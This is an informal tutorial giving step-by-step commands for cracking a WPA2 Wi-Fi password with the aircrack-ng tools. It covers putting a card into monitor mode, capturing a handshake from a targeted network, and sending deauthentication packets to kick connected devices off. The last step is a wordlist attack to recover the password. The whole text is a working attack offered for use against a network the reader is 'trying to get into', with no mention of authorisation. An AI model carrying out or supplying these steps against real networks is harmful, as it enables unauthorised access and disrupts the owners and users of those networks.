Hello World!
This is how to crack wifi manual (WPA2)

//Step 1

First u need to put the Wifi card into Monitor mode

by using these commands

ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up

while (wlan0) is the Interface
to see in which state the card is and whats how its named u can type iwconfig

To scan the area with your wifi card type

airodump-ng

//Step 2

Find information about the wifi u trying to get into

when u type airodump-ng u can see all the networks that are in you area
then u should see the BSSID and the Channel that u target is in
write these 2 things down

To crack a wifi u need to capture a "Handshake"
to capture a handshake of the wifi u need to type in this command
insert the 2 things u wrote down earlier in here

airodump-ng -c {channel} --bssid {BSSID} -w {name of output file} {wifi card}

//Step 3 Optional

To speed up the capturing of the handshake a device needs to connect to the wifi
so to kick all devices from the network type but let the windows can where u are
currently in just open another terminal window
5-10 deauth pakets should kick the device off

aireplay-ng -0 {how many deauth pakets} -a {BSSID} {wifi card}

u can also send the deauth pakage to a specific device in the network type

aireplay-ng -0 {how many deauth pakets} -a {BSSID} -c {device id marked as STATION} {wifi card}

//Step 4

If you captured the handshake successfully type

aircrack-ng -w {name and path of the word list} -b {BSSID} {file name of the outputfile from earlier}*.cap

to crack the password
but need a .txt file that contains words to hack the password
